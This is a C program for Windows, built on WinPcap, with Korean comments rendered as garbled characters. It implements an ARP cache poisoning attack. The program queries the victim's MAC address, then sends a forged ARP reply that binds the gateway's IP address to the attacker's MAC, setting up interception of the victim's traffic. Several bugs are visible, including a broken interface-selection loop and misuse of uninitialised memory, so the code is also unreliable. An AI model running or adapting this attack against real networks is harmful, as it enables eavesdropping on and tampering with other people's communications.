#define _WINSOCKAPI_    // IPHlpAPi�� Winsock�� ���� ���� �־����ϴ�. 
#include <windows.h>	// �ȳ����� ������ �߻��մϴ�.

#include <IPHlpApi.h>	// GetAdaptersInfo�� ���� ����� ������ ���ɴϴ�.
#pragma comment(lib, "iphlpapi.lib")

#include <stdlib.h>
#include <stdio.h>

#define HAVE_REMOTE
#include <pcap\pcap.h>

//�̴��� ��� �Դϴ�.
typedef struct {
	u_char dmac[6]; // 6
	u_char smac[6]; // 12
	u_short etype; //  14
}ETHER_HDR;

//ARP ��� �Դϴ�.
typedef struct {
	u_short hard_type; // 16
	u_short prot_type; // 18
	u_char hard_len;   // 19
	u_char prot_len;	//20
	u_short op;			//22
	u_char smac[6];		//28
	u_char sip[4];		//32
	u_char dmac[6];		//38
	u_char dip[4];		//42
}ARP_HDR;

//�����ϴ� �Լ��Դϴ�.
//pcap_t ���� �ϳ��� Victim PC�� ip�� ���ڷ� �޽��ϴ�.
int arp_atk(pcap_t *fp, char * ip) {
	u_char packet[256]; // ���� ��Ŷ�� ũ�� 256�� u_char������ �������ݴϴ�. 

	DWORD size = sizeof(PIP_ADAPTER_INFO); // ����� ������ ũ���Դϴ�.
	
	//pcap_next_ex�� ���� ��Ŷ�� �޾Ƶ鿩 ������ �����Դϴ�.
	struct pcap_pkthdr *header;
	const u_char *pkt_data;

	//���ۿ� ���� �̴��� ����� ARP ��� ����ü�Դϴ�.
	ETHER_HDR eth;
	ARP_HDR arp;

	//���ſ� ���� �̴��� ����� ARP ��� ����ü �������Դϴ�.
	ETHER_HDR *reth;
	ARP_HDR *rarp;

	int res; // pcap_next_ex�� ����� ������ �����Դϴ�.
	u_char myIP[4], gwIP[4], vIP[4]; // Attacker�� IP�� ����Ʈ������ IP �׸��� Victim�� IP�� ������ �����Դϴ�.

	//vIP�� Victim�� IP�� �����մϴ�.
	for (int i = 0; i < 4; i++)
		vIP[i] = inet_addr(ip) >> (8 * i) & 0xff;

	//info->Address�� Attacker�� MAC �ּҸ� �����մϴ�.
	PIP_ADAPTER_INFO info;
	ZeroMemory(&info, size);
	int result = GetAdaptersInfo(info, &size);
	if (result == ERROR_BUFFER_OVERFLOW) {
		info = (PIP_ADAPTER_INFO)malloc(size);
		if (!info) return 0;
		GetAdaptersInfo(info, &size);
	}

	for (int i = 0; i < 4; i++) // myIP�� Attacker�� IP�� �����մϴ�.
		myIP[i] = inet_addr(info->IpAddressList.IpAddress.String) >> (8 * i) & 0xff;

	for (int i = 0; i < 4; i++) // gwIP�� ����Ʈ������ IP�� �����մϴ�.
		gwIP[i] = inet_addr(info->GatewayList.IpAddress.String) >> (8 * i) & 0xff;

	//packet�� �ϴ� 0���� �ʱ�ȭ �մϴ�.
	memset(packet, 0, sizeof(packet));

	//�̴��� ����� �ʱ�ȭ ���ݴϴ�.
	memcpy(eth.smac, info->Address,6); // SMAC�� Attacker�� MAC
	memset(eth.dmac, 0xff, 6);		   // DMAC�� ��ε�ĳ��Ʈ
	eth.etype = htons(0x806);		   // �̴��� Ÿ���� ARP

	memcpy(packet, &eth, sizeof(eth)); // packet�� �̴��� ����� �����մϴ�. 

	//ARP ����� �ʱ�ȭ ���ݴϴ�.
	arp.hard_type = htons(0x1);		// �ϵ���� Ÿ���� �̴���
	arp.hard_len = 6;				
	arp.prot_len = 4;
	arp.prot_type = htons(0x0800);	// �������� Ÿ���� IP
	arp.op = htons(1);			// operation code�� REQUEST ���
	memcpy(arp.sip, myIP, 4);	// ARP_SIP�� Attacker�� IP
	memcpy(arp.dip, vIP, 4);	// ARP_DIP�� Victim�� IP
	memcpy(arp.smac, info->Address, 6); // ARP_SMAC�� Attacker�� MAC
 	memset(arp.dmac, 0, 6); // ARP_DMAC�� ��ε� ĳ��Ʈ�� �����մϴ�.

	memcpy(packet + sizeof(eth), &arp, sizeof(arp)); // packet�� �̴��� ��� ������ ARP �����
													 // �����Դϴ�.
	if (pcap_sendpacket(fp, packet, 60) != 0) { // ��Ŷ�� ���� 60��ŭ �����ϴ�.
		return -1; // ���� ���ۿ� ������ �������� -1�� ��ȯ�մϴ�.
	}

	//rarp->smac�� Victim�� MAC�� �����մϴ�.
	while ((res = pcap_next_ex(fp, &header, &pkt_data)) >= 0) { // ARP Request�� ������ ��� ��Ŷ�� �н��ϴ�.
		reth = (ETHER_HDR*)pkt_data; // reth�� rarp�� ������ ��Ŷ�� �̴�������� ARP����� �ǹ��մϴ�.
		rarp = (ARP_HDR*)((u_char*)reth + sizeof(*reth));
		//������ ��Ŷ�� ARP�̰� opcode�� Reply�̸� Request���� DMAC�� ������ ��Ŷ�� SMAC�� ���ٸ� ���� ��û��
		//Reply���� Ȯ���ϰ� break�� while���� �������ɴϴ�.
		if (ntohs(reth->etype) == 0x806 && ntohs(rarp->op) == 2 && memcmp(rarp->dmac, arp.smac, 4 * 4) == 0)
			break;
	}

	//�̴��� ����� ARP ����� ���� �����մϴ�.
	memcpy(eth.dmac, rarp->smac, 6); // DMAC�� Victim�� MAC
	memcpy(arp.dmac, rarp->smac, 6); // ARP_DMAC�� Victim�� MAC
	memcpy(arp.sip, gwIP, 4); // SIP�� ����Ʈ������ IP
	arp.op = htons(2); // operation code�� REPLY�� �����մϴ�.

	//������ �̴��� ����� ARP����� ��Ŷ�� ������մϴ�.
	memcpy(packet, &eth, sizeof(eth));
	memcpy(packet + sizeof(eth), &arp, sizeof(arp));

	//�׸��� �ٽ� ��Ŷ�� �����ϴ�.
	if (pcap_sendpacket(fp, packet, 60) != 0) {
		return -1; // ���� ���ۿ� ������ �������� -1�� ��ȯ�մϴ�.
	}
}

int main() {

	pcap_if_t *alldevs;
	pcap_if_t *d;
	pcap_t *fp;
	char errbuf[PCAP_ERRBUF_SIZE];

	int inum;
	int i = 0;
	char ip[32];

	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1) {
		fprintf(stderr, "Error in pcap_findalldevs_ex");
		exit(1);
	}

	for (d = alldevs; d; d = d->next) {
		printf("%d, %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available");
	}

	if (i == 0) {
		printf("\nNo interface found! Make sure WinPcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf("%d", &inum);

	if (inum < 1 || inum > i) {
		printf("\nInterface number out of range\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	for (d = alldevs; i = 0; i < inum - 1, d = d->next);

	if ((fp = pcap_open_live(d->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, errbuf)) == NULL) {
		fprintf(stderr, "\nUnable to open the adapter\n");
		return -1;
	}

	IP_ADAPTER_INFO *info = NULL;
	DWORD size = 0;

	printf("dip : ");
	scanf_s("%s", ip, sizeof(ip));

	arp_atk(fp, ip);


	return 0;
}